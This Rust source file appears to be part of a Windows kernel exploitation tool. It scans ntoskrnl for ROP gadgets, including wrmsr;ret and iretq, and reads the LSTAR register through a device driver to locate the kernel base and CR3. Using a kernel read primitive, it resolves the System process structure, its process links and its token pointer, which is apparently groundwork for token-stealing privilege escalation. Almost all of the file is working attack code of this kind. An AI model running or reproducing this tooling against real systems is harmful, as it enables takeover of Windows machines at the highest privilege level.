use anyhow::{Context, Result};

use crate::device::{msr_read, Device, MSR_LSTAR};
use crate::eprocess::{resolve_system_eprocess, EPROC_ACTIVE_LINKS, EPROC_TOKEN, EPROC_UNIQUE_PID};
use crate::gadgets::{scan_gadgets_in_pe, Gadgets};
use crate::kernel_rw::KernelRW;
use crate::utils::{
    find_cr3_for_va, find_export_va, find_mod, get_kernel_modules, ntoskrnl_disk_path, KernelMod,
};

pub fn cmd_scan_gadgets(mods: &[KernelMod], runtime_base: u64) -> Result<Gadgets> {
    let path = ntoskrnl_disk_path(mods)?;
    println!("[*] reading {} from disk...", path);
    let pe_bytes = std::fs::read(&path)
        .with_context(|| format!("cannot read {}", path))?;
    println!("  [i] {} bytes read, scanning executable sections", pe_bytes.len());

    let gadgets = scan_gadgets_in_pe(&pe_bytes, runtime_base)?;

    println!("[*] gadget scan results:");
    macro_rules! print_gadget {
        ($field:expr, $label:literal) => {
            match $field {
                Some(va) => println!("  [+] {:20} 0x{:016X}", $label, va),
                None     => println!("  [!] {:20} NOT FOUND", $label),
            }
        };
    }
    print_gadget!(gadgets.write_mem, "mov [rdx],rax;ret");
    match gadgets.read_mem {
        Some((va, reg)) => println!("  [+] {:20} 0x{:016X}", format!("mov rax,[{:?}];ret", reg).to_lowercase(), va),
        None            => println!("  [!] {:20} NOT FOUND", "mov rax,[reg];ret"),
    }
    print_gadget!(gadgets.pop_rcx,   "pop rcx;ret");
    print_gadget!(gadgets.pop_rax,   "pop rax;ret");
    print_gadget!(gadgets.pop_rdx,   "pop rdx;ret");
    print_gadget!(gadgets.wrmsr_ret, "wrmsr;ret");
    print_gadget!(gadgets.iretq,     "iretq");

    if gadgets.all_found() {
        println!("[+] all gadgets found");
    } else {
        println!("[!] one or more gadgets missing");
    }

    Ok(gadgets)
}

pub fn cmd_lookup_export(dev: &Device, symbol: &str) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let va = find_export_va(&pe, nt.va, symbol)?;
    println!("[+] {} VA=0x{:016X}", symbol, va);
    Ok(())
}

pub fn cmd_eprocess(dev: &Device) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let ps_va = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    println!("[+] PsInitialSystemProcess VA=0x{:016X}", ps_va);
    let krw = KernelRW::setup(dev, &pe, nt.va)?;
    let eproc = krw.kread(ps_va)?;
    println!("[+] System EPROCESS=0x{:016X}", eproc);
    Ok(())
}

pub fn cmd_procid(dev: &Device) -> Result<()> {
    let (krw, eproc) = resolve_system_eprocess(dev)?;
    let pid = krw.kread(eproc + EPROC_UNIQUE_PID)?;
    println!("[+] UniqueProcessId (+0x{:X}) = {}", EPROC_UNIQUE_PID, pid);
    Ok(())
}

pub fn cmd_proclinks(dev: &Device) -> Result<()> {
    let (krw, eproc) = resolve_system_eprocess(dev)?;
    let flink = krw.kread(eproc + EPROC_ACTIVE_LINKS)?;
    let blink = krw.kread(eproc + EPROC_ACTIVE_LINKS + 8)?;
    println!("[+] ActiveProcessLinks (+0x{:X}):", EPROC_ACTIVE_LINKS);
    println!("    Flink = 0x{:016X}  (EPROCESS 0x{:016X})", flink, flink.wrapping_sub(EPROC_ACTIVE_LINKS));
    println!("    Blink = 0x{:016X}  (EPROCESS 0x{:016X})", blink, blink.wrapping_sub(EPROC_ACTIVE_LINKS));
    Ok(())
}

pub fn cmd_token(dev: &Device) -> Result<()> {
    let (krw, eproc) = resolve_system_eprocess(dev)?;
    let token_ref = krw.kread(eproc + EPROC_TOKEN)?;
    let token = token_ref & !0xF;
    println!("[+] Token (+0x{:X}):", EPROC_TOKEN);
    println!("    EX_FAST_REF = 0x{:016X}  (ptr = 0x{:016X})", token_ref, token);
    Ok(())
}

pub fn cmd_find_kbase(dev: &Device) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
    println!("  [i] size=0x{:X}", nt.size);

    let lstar = match msr_read(dev, MSR_LSTAR) {
        Ok(v) => { println!("[+] IA32_LSTAR=0x{:016X}", v); v }
        Err(e) => { println!("[~] RDMSR LSTAR failed: {}", e); 0 }
    };
    if lstar == 0 {
        println!("[!] cannot validate CR3 without LSTAR");
        return Ok(());
    }

    match find_cr3_for_va(dev, nt.va, nt.size, lstar) {
        Some((cr3, nt_pa)) => {
            println!("[+] CR3=0x{:X}", cr3);
            println!("[+] ntoskrnl PA=0x{:X}", nt_pa);
        }
        None => {
            return Ok(());
        }
    }

    Ok(())
}
